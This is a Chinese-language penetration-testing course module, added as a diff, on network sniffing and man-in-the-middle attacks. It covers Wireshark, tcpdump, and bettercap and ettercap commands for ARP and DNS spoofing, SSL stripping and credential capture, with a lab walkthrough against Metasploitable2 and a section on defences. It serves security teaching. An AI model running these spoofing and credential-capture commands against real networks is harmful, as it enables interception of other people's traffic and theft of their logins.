@@ -1,0 +1,662 @@
+================================================================================
+模块06: 网络嗅探与中间人攻击
+================================================================================
+
+【学习目标】
+1. 掌握Wireshark界面操作和数据包分析
+2. 熟练使用tcpdump命令行抓包
+3. 学会bettercap进行MITM攻击和凭证捕获
+4. 理解ARP欺骗和DNS欺骗原理
+5. 能搭建实验网络实践MITM攻击
+
+【所需工具】(archstrike-base已预装)
+- wireshark (或tshark)
+- tcpdump
+- bettercap
+- ettercap (可选)
+- Metasploitable2 + 一台Windows/Linux测试虚拟机
+
+================================================================================
+第一部分: 网络嗅探基础概念
+================================================================================
+
+1.1 网络数据包传输原理
+--------------------------------------------------
+  正常通信:
+    A ←→ B  (直接通信, 交换机将包只转发给目标MAC)
+
+  嗅探模式:
+    1. 集线器(Hub)网络: 所有设备都能看到所有包 (已不常见)
+    2. 端口镜像(SPAN): 交换机配置端口镜像, 复制流量到监控端口
+    3. ARP欺骗: 欺骗受害者的ARP表, 将流量导向攻击机
+
+1.2 混杂模式 (Promiscuous Mode)
+--------------------------------------------------
+  网卡默认只接收目标MAC为自己的帧
+  混杂模式下, 网卡接收所有可收到的帧
+
+  启用混杂模式:
+  sudo ip link set eth0 promisc on
+  sudo ifconfig eth0 promisc
+
+  查看状态:
+  ip link show eth0 | grep PROMISC
+
+1.3 常见协议层次
+--------------------------------------------------
+  - 数据链路层: Ethernet, ARP, VLAN
+  - 网络层: IP, ICMP
+  - 传输层: TCP, UDP
+  - 应用层: HTTP, DNS, FTP, SMTP, SMB, SSH
+
+================================================================================
+第二部分: Wireshark 使用教程
+================================================================================
+
+2.1 界面和基本操作
+--------------------------------------------------
+
+启动: sudo wireshark
+
+操作步骤:
+  Step 1: 选择网卡 (eth0, wlan0等)
+  Step 2: 点击"Start Capturing" (鲨鱼鳍图标)
+  Step 3: 观察实时捕获的数据包
+  Step 4: 使用过滤器筛选
+  Step 5: 点击数据包查看详细信息
+  Step 6: 右键 → Follow → TCP Stream 追踪完整TCP会话
+
+三个面板:
+  - 顶部: 数据包列表 (Packet List)
+  - 中部: 数据包详情 (Packet Details) - 分层展示
+  - 底部: 原始数据 (Packet Bytes) - 十六进制和ASCII
+
+2.2 常用显示过滤器 (Display Filter)
+--------------------------------------------------
+
+协议过滤:
+  http                          # 仅显示HTTP包
+  dns                           # 仅显示DNS包
+  tcp                           # 仅显示TCP包
+  udp                           # 仅显示UDP包
+  arp                           # 仅显示ARP包
+  icmp                          # 仅显示ICMP包
+  tls 或 ssl                    # 仅显示TLS/SSL包
+
+IP地址过滤:
+  ip.addr == 192.168.1.100      # 源或目标为该IP
+  ip.src == 192.168.1.50        # 源IP
+  ip.dst == 192.168.1.100       # 目标IP
+
+端口过滤:
+  tcp.port == 80                # TCP 80端口
+  tcp.port == 443               # TCP 443端口
+  tcp.dstport == 22             # 目标端口22
+  tcp.srcport == 80             # 源端口80
+  udp.port == 53                # UDP 53端口
+
+HTTP过滤:
+  http.request                  # HTTP请求
+  http.response                 # HTTP响应
+  http.request.method == POST   # POST请求
+  http.request.uri contains "login"  # 登录相关请求
+  http contains "password"      # 包含password的数据
+
+组合过滤:
+  ip.addr==192.168.1.100 && tcp.port==80
+  ip.addr==192.168.1.100 && (tcp.port==80 || tcp.port==443)
+  http.request.method == POST && ip.addr == 192.168.1.100
+  !(arp || dns || icmp)         # 排除ARP/DNS/ICMP
+
+2.3 追踪TCP流 (Follow TCP Stream)
+--------------------------------------------------
+  右键数据包 → Follow → TCP Stream
+  - 查看完整的HTTP请求/响应 (会话重建)
+  - 红色: 客户端发送的数据
+  - 蓝色: 服务器发送的数据
+  - 底部可选择编码方式查看
+
+2.4 统计与分析
+--------------------------------------------------
+  Statistics → Summary           # 捕获摘要
+  Statistics → Protocol Hierarchy  # 协议层次统计
+  Statistics → Conversations     # 会话统计 (TCP/UDP)
+  Statistics → Endpoints         # 端点统计
+  Statistics → HTTP → Requests   # HTTP请求列表
+  Statistics → Flow Graph        # 通信流程图
+
+2.5 着色规则 (Coloring Rules)
+--------------------------------------------------
+  粉色: TCP重传
+  黑色: TCP问题包 (重复ACK, 乱序等)
+  浅蓝: DNS
+  绿色: HTTP
+  浅黄: ARP
+  深灰: 错误数据包
+
+2.6 捕获过滤器 (Capture Filter)
+--------------------------------------------------
+  格式 (BPF语法):
+  host 192.168.1.100            # 只捕获该IP的流量
+  port 80                       # 只捕获80端口的流量
+  port 80 or port 443
+  tcp port 80
+  net 192.168.1.0/24
+  src host 192.168.1.100
+  dst host 192.168.1.100
+  not arp                       # 排除ARP
+  not broadcast and not multicast
+
+================================================================================
+第三部分: tcpdump 命令行抓包
+================================================================================
+
+3.1 基本命令
+--------------------------------------------------
+
+  # 捕获所有流量
+  sudo tcpdump -i eth0
+
+  # 指定捕获数量
+  sudo tcpdump -i eth0 -c 100
+
+  # 不解析主机名
+  sudo tcpdump -i eth0 -n
+
+  # 显示链路层头部
+  sudo tcpdump -i eth0 -e
+
+  # 详细输出
+  sudo tcpdump -i eth0 -v       # 详细
+  sudo tcpdump -i eth0 -vv      # 更详细
+  sudo tcpdump -i eth0 -vvv     # 最详细
+
+  # 十六进制输出
+  sudo tcpdump -i eth0 -X
+
+  # ASCII输出
+  sudo tcpdump -i eth0 -A
+
+3.2 保存和读取捕获文件
+--------------------------------------------------
+
+  # 保存到文件
+  sudo tcpdump -i eth0 -w capture.pcap
+
+  # 读取文件
+  tcpdump -r capture.pcap
+
+  # 读取并用Wireshark查看
+  wireshark capture.pcap
+
+  # 限制文件的捕获大小 (MB)
+  sudo tcpdump -i eth0 -C 100 -w capture.pcap
+
+  # 切割文件 (每100MB一个文件)
+  sudo tcpdump -i eth0 -C 100 -W 5 -w capture.pcap  # 保存5个文件后覆盖
+
+3.3 BPF过滤器
+--------------------------------------------------
+
+  # CAPTURE FILTER (BPF语法)
+  sudo tcpdump -i eth0 host 192.168.1.100
+  sudo tcpdump -i eth0 port 80
+  sudo tcpdump -i eth0 port 80 or port 443
+  sudo tcpdump -i eth0 tcp port 22
+  sudo tcpdump -i eth0 src 192.168.1.100
+  sudo tcpdump -i eth0 dst port 80
+  sudo tcpdump -i eth0 net 192.168.1.0/24
+  sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'   # SYN包
+  sudo tcpdump -i eth0 'tcp[13] & 2 != 0'                 # 同上
+
+  排除流量:
+  sudo tcpdump -i eth0 not arp and not port 22
+
+3.4 实用嗅探场景
+--------------------------------------------------
+
+  # 嗅探HTTP流量
+  sudo tcpdump -i eth0 -A -s 0 'tcp port 80'
+
+  # 嗅探DNS查询
+  sudo tcpdump -i eth0 -n udp port 53
+
+  # 嗅探特定主机的流量
+  sudo tcpdump -i eth0 -n host 192.168.1.100
+
+  # 记录所有到文件的HTTP流量
+  sudo tcpdump -i eth0 -w http_capture.pcap port 80
+
+  # 实时查看HTTP GET请求
+  sudo tcpdump -i eth0 -A -s 0 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'
+
+  # 嗅探SMTP/POP3/IMAP (明文邮箱)
+  sudo tcpdump -i eth0 -A port 25 or port 110 or port 143
+
+  # 嗅探FTP (明文密码)
+  sudo tcpdump -i eth0 -A port 21
+
+================================================================================
+第四部分: bettercap MITM攻击框架
+================================================================================
+
+4.1 工具介绍
+--------------------------------------------------
+bettercap 是功能强大的MITM (中间人) 攻击框架, 支持:
+  - ARP欺骗
+  - DNS欺骗
+  - HTTP/HTTPS代理 (凭证捕获)
+  - 网络嗅探
+  - WiFi攻击
+  - 会话劫持
+  - SSL降级攻击
+
+4.2 基本启动
+--------------------------------------------------
+
+  # 启动 (交互式模式)
+  sudo bettercap -iface eth0
+
+  # 查看帮助
+  help
+
+  # 查看特定模块帮助
+  help net.sniff
+
+4.3 ARP欺骗和网络嗅探
+--------------------------------------------------
+
+  Step 1: 启动bettercap
+    sudo bettercap -iface eth0
+
+  Step 2: 查看网络中的主机
+    net.show                            # 显示主机列表
+
+  Step 3: 开启ARP欺骗 (整个子网)
+    net.probe on                        # 启用网络探测
+    set arp.spoof.targets 192.168.1.100  # 设置欺骗目标 (单个)
+    set arp.spoof.targets 192.168.1.0/24 # 设置欺骗目标 (整个子网)
+    arp.spoof on                        # 开启ARP欺骗
+
+  Step 4: 开启网络嗅探
+    set net.sniff.verbose true          # 详细输出
+    set net.sniff.local true            # 也嗅探本地流量
+    set net.sniff.filter "tcp port 80"  # 过滤HTTP
+    net.sniff on                        # 开始嗅探
+
+  Step 5: 查看捕获的凭证
+    events.stream on                    # 实时查看事件流
+    (凭证会自动显示)
+
+4.4 HTTP/HTTPS透明代理与凭证捕获
+--------------------------------------------------
+
+  Step 1: 开启ARP欺骗 (前提)
+    set arp.spoof.targets 192.168.1.100
+    arp.spoof on
+
+  Step 2: 开启HTTP代理
+    set http.proxy.sslstrip true        # SSL降级 (将HTTPS降级为HTTP)
+    http.proxy on                       # 开启HTTP代理
+
+  Step 3: 开启HTTPS代理
+    https.proxy on                      # 开启HTTPS代理 (使用自签证书)
+
+  Step 4: 查看捕获的凭证
+    events.stream on
+    # 当目标浏览HTTP网站时, 凭证会自动捕获
+
+  Step 5: 查看捕获的POST数据
+    set http.proxy.dump_file /tmp/http_dump.log
+    tail -f /tmp/http_dump.log          # 实时查看捕获的POST数据
+
+4.5 完整配置脚本
+--------------------------------------------------
+
+创建一个caplet文件 (bettercap脚本):
+
+文件: /tmp/mitm.cap
+内容:
+  # 基础配置
+  set arp.spoof.targets 192.168.1.100
+  set net.sniff.verbose true
+  set net.sniff.local true
+
+  # 开始攻击
+  net.probe on
+  arp.spoof on
+  http.proxy on
+  net.sniff on
+
+  # 显示事件
+  events.stream on
+
+加载并执行:
+  sudo bettercap -iface eth0 -caplet /tmp/mitm.cap
+
+4.6 其他bettercap功能
+--------------------------------------------------
+
+  # DNS欺骗
+  set dns.spoof.domains *.example.com
+  dns.spoof on
+
+  # WiFi扫描
+  wifi.recon on
+
+  # 查看帮助
+  help net.probe
+  help arp.spoof
+  help http.proxy
+  help net.sniff
+
+================================================================================
+第五部分: ettercap 使用
+================================================================================
+
+5.1 工具介绍
+--------------------------------------------------
+ettercap 是经典的MITM攻击套件, 支持:
+  - ARP欺骗 (最常用)
+  - DNS欺骗
+  - 内容过滤/注入
+  - 协议分析插件
+
+5.2 命令行操作
+--------------------------------------------------
+
+  # 图形界面启动
+  sudo ettercap -G
+
+  # 命令行ARP欺骗
+  sudo ettercap -T -M arp:remote /192.168.1.100/ /192.168.1.1/
+
+  参数说明:
+    -T       文本模式 (命令行)
+    -M       中间人方法 (arp:remote)
+    -w       保存捕获到文件
+    -i       指定接口
+    -q       安静模式
+
+  # 嗅探并保存
+  sudo ettercap -T -M arp:remote -i eth0 /192.168.1.100/ /192.168.1.1/ -w capture.pcap
+
+  # 带插件的嗅探 (捕获密码)
+  sudo ettercap -T -M arp:remote -i eth0 /192.168.1.100/ /192.168.1.1/ -P autoadd
+
+5.3 ARP欺骗命令格式
+--------------------------------------------------
+  /IP1/ /IP2/           # 单向: 欺骗IP1使其认为攻击机是IP2
+  /IP1/ /IP2/ /IP3/     # 双向: IP1↔IP2, IP1↔IP3
+  //                    # 整个子网
+
+  ettercap -T -M arp:remote // //      # 全网ARP欺骗 (谨慎!)
+
+================================================================================
+第六部分: ARP欺骗原理
+================================================================================
+
+6.1 什么是ARP
+--------------------------------------------------
+ARP (Address Resolution Protocol) 用于将IP地址解析为MAC地址:
+  - ARP请求: "谁有192.168.1.1? 告诉我"
+  - ARP响应: "192.168.1.1 是 aa:bb:cc:dd:ee:ff"
+
+6.2 ARP欺骗原理
+--------------------------------------------------
+正常流程:
+  1. 受害者(192.168.1.100) 想知道网关(192.168.1.1)的MAC
+  2. 受害者发出 ARP请求: "192.168.1.1的MAC是什么?"
+  3. 网关回复 ARP响应: "192.168.1.1 是 xx:xx:xx:xx:xx:xx"
+
+攻击流程:
+  1. 攻击机持续发送伪造的ARP响应
+  2. 告诉受害者: "192.168.1.1的MAC是攻击机的MAC"
+  3. 告诉网关: "192.168.1.100的MAC是攻击机的MAC"
+  4. 受害者所有外网流量都经过攻击机
+  5. 攻击机可查看/修改/丢弃这些流量
+
+6.3 手工ARP欺骗演示
+--------------------------------------------------
+  使用arpspoof工具 (需要安装: pacman -S dsniff):
+  
+  开启IP转发:
+    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+  欺骗受害者:
+    sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+  
+  欺骗网关:
+    sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+6.4 检测ARP欺骗
+--------------------------------------------------
+  # 查看ARP表
+  arp -a
+
+  # 使用arpwatch监控ARP表变化
+  sudo pacman -S arpwatch
+  sudo arpwatch -i eth0
+
+================================================================================
+第七部分: DNS欺骗
+================================================================================
+
+7.1 DNS欺骗原理
+--------------------------------------------------
+正常DNS: 用户请求google.com → DNS服务器返回真实IP
+DNS欺骗: 攻击机拦截DNS请求 → 返回攻击机的IP
+
+7.2 bettercap DNS欺骗
+--------------------------------------------------
+  sudo bettercap -iface eth0
+  set dns.spoof.domains google.com,*.example.com
+  set dns.spoof.address 192.168.1.50   # 返回攻击机IP
+  set arp.spoof.targets 192.168.1.100
+  arp.spoof on
+  dns.spoof on
+
+7.3 ettercap DNS欺骗
+--------------------------------------------------
+编辑 /etc/ettercap/etter.dns:
+  google.com     A   192.168.1.50       # google.com解析到攻击机
+  *.example.com  A   192.168.1.50       # example.com所有子域名到攻击机
+
+启动ettercap + DNS欺骗插件:
+  sudo ettercap -T -M arp:remote -i eth0 /192.168.1.100/ // -P dns_spoof
+
+================================================================================
+第八部分: 实践练习
+================================================================================
+
+目标: 在实验网络中搭建MITM环境, 捕获明文凭证
+
+实验拓扑:
+  攻击机 (ArchStrike): 192.168.1.50
+  目标靶机 (Metasploitable2): 192.168.1.100
+  网关: 192.168.1.1
+  (如无独立网关, 可用任意IP测试)
+
+【路线指引 - MITM攻击完整流程】
+
+=== 阶段一: 环境准备 ===
+
+Step 1: 确认网卡名
+  ip addr show
+  记录网卡名 (通常是eth0, ens33等)
+
+Step 2: 开启IP转发
+  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+  cat /proc/sys/net/ipv4/ip_forward   # 确认=1
+
+Step 3: 确认目标在线
+  ping -c 3 192.168.1.100
+  ping -c 3 192.168.1.1               # 网关
+
+Step 4: 创建实验目录
+  mkdir -p ~/mitm_lab && cd ~/mitm_lab
+
+=== 阶段二: tcpdump基本抓包 ===
+
+Step 5: 开始捕获目标流量
+  在终端输入:
+  sudo tcpdump -i eth0 host 192.168.1.100 -w target_traffic.pcap
+
+Step 6: 在另一个终端, 访问Metasploitable2的Web服务
+  打开Firefox
+  在地址栏输入: http://192.168.1.100/
+  浏览几个页面: DVWA, Mutillidae, phpMyAdmin
+
+Step 7: 停止抓包
+  在tcpdump终端按 Ctrl+C
+
+Step 8: 分析捕获的流量
+  tcpdump -r target_traffic.pcap | head -50
+  或用Wireshark打开: wireshark target_traffic.pcap
+
+=== 阶段三: Wireshark分析 ===
+
+Step 9: 使用Wireshark打开pcap文件
+  sudo wireshark target_traffic.pcap
+
+Step 10: 在Wireshark中应用过滤器
+  Step A: 在过滤器栏输入: http
+    按回车, 仅显示HTTP包
+
+  Step B: 找一个HTTP POST请求
+    在Packet List中查找POST请求 (通常在Info列显示POST)
+
+  Step C: 展开查看数据包详情
+    在Packet Details中展开: Hypertext Transfer Protocol
+    查看: Request Method, Request URI, Form item等
+
+  Step D: 追踪TCP流
+    右键数据包 → Follow → TCP Stream
+    查看完整的HTTP会话 (请求和响应)
+    注意查看POST数据中的用户名和密码
+
+Step 11: 找到登录凭证
+  在DVWA登录页面 (或者其他页面)
+  在TCP流中搜索: password, pass, user, login等关键词
+
+=== 阶段四: bettercap MITM攻击 ===
+
+Step 12: 启动bettercap
+  sudo bettercap -iface eth0
+  (等待提示符变为 192.168.1.0/24 >)
+
+Step 13: 查看网络探测
+  在bettercap中:
+  输入: net.show
+  查看发现的设备列表, 确认192.168.1.100在其中
+
+Step 14: 开始ARP欺骗
+  输入: 
+  set arp.spoof.targets 192.168.1.100
+  set arp.spoof.internal true     # 也欺骗内部通信
+  arp.spoof on
+  (看到开始发送ARP包的提示)
+
+Step 15: 开启HTTP代理
+  输入:
+  set http.proxy.sslstrip true
+  http.proxy on
+
+Step 16: 开启网络嗅探
+  输入:
+  set net.sniff.verbose true
+  net.sniff on
+
+Step 17: 查看事件流
+  输入:
+  events.stream on
+
+Step 18: 在目标上触发流量
+  现在需要模拟受害者操作:
+  
+  切换到Metasploitable2的终端 (如果有直接访问)
+  或: 如果有另一台测试机, 在该机上:
+    打开Firefox
+    访问任意HTTP网站 (如 http://testfire.net)
+    在登录页输入测试凭证: admin/testpass123
+    
+  如果你只有ArchStrike一台机器, 可以:
+    在Firefox中访问本地HTTP服务
+    并设置代理指向攻击机
+
+Step 19: 查看bettercap捕获的凭证
+  在bettercap的事件流中 (events.stream on)
+  你应该能看到类似:
+  [sys.log] [http.request] 
+    GET/POST http://example.com/login
+    username=admin
+    password=testpass123
+
+Step 20: 查看HTTP dump文件
+  在bettercap中:
+  set http.proxy.dump_file /tmp/mitm_http.txt
+  然后在新的终端中输入:
+  tail -f /tmp/mitm_http.txt
+
+=== 阶段五: ettercap模拟 ===
+
+Step 21: 如果是测试环境, 练习使用ettercap
+  sudo ettercap -T -M arp:remote -i eth0 /192.168.1.100/ // -w ettercap_capture.pcap
+  等待几分钟让ettercap捕获流量
+  按q退出
+  用Wireshark查看 ettercap_capture.pcap
+
+=== 阶段六: 停止攻击和网络恢复 ===
+
+Step 22: 在bettercap中停止所有模块
+  arp.spoof off
+  http.proxy off
+  net.sniff off
+  events.stream off
+  exit
+
+Step 23: 清除ARP缓存 (可选, 恢复网络)
+  在目标机器上 (如果有权限):
+  arp -d 192.168.1.1          # 清除网关ARP缓存
+
+=== 阶段七: 分析捕获数据 ===
+
+Step 24: 查看bettercap日志
+  ls -la /root/bettercap*      # 查看bettercap日志和pcap文件
+
+Step 25: 分析完整捕获
+  sudo tcpdump -r /tmp/mitm_http.txt 2>/dev/null || \
+  sudo tcpdump -r /root/bettercap*.pcap 2>/dev/null | head -100
+
+Step 26: 编写MITM实践报告
+  echo "=== MITM攻击实践报告 ===" > mitm_report.txt
+  echo "" >> mitm_report.txt
+  echo "攻击拓扑:" >> mitm_report.txt
+  echo "  攻击机: 192.168.1.50" >> mitm_report.txt
+  echo "  受害者: 192.168.1.100" >> mitm_report.txt
+  echo "  方法: ARP欺骗 + HTTP代理" >> mitm_report.txt
+  echo "" >> mitm_report.txt
+  echo "捕获到的信息类型:" >> mitm_report.txt
+  echo "  - HTTP明文请求" >> mitm_report.txt
+  echo "  - HTTP POST登录凭证" >> mitm_report.txt
+  echo "  - 浏览的URL" >> mitm_report.txt
+  echo "" >> mitm_report.txt
+  echo "防御措施:" >> mitm_report.txt
+  echo "  1. 使用HTTPS (全站SSL)" >> mitm_report.txt
+  echo "  2. HSTS (HTTP Strict Transport Security)" >> mitm_report.txt
+  echo "  3. 静态ARP表 (关键设备)" >> mitm_report.txt
+  echo "  4. ARP监控 (arpwatch/arpalert)" >> mitm_report.txt
+  echo "  5. 交换机端口安全 (DAI + DHCP Snooping)" >> mitm_report.txt
+
+【注意事项与提示】
+- MITM攻击具有高度侵入性, 仅在授权测试环境中执行
+- ARP欺骗会破坏网络通信, 实验结束后务必停止并恢复
+- HTTPS代理需要目标接受自签证书 (浏览器会警告)
+- 生产环境中SSLStrip可能无效 (HSTS预加载)
+- 使用Wireshark的"Statistics → Protocol Hierarchy"查看流量组成
+- tcpdump的-w保存完整pcap, Wireshark可做深度分析
+- bettercap的事件流可直接看到明文凭证, 效率极高
+- 检测自身是否被ARP欺骗: arp -a 查看是否有重复MAC
+- IPv6环境下有类似的邻居欺骗(Neighbor Spoofing)攻击
+
+================================================================================
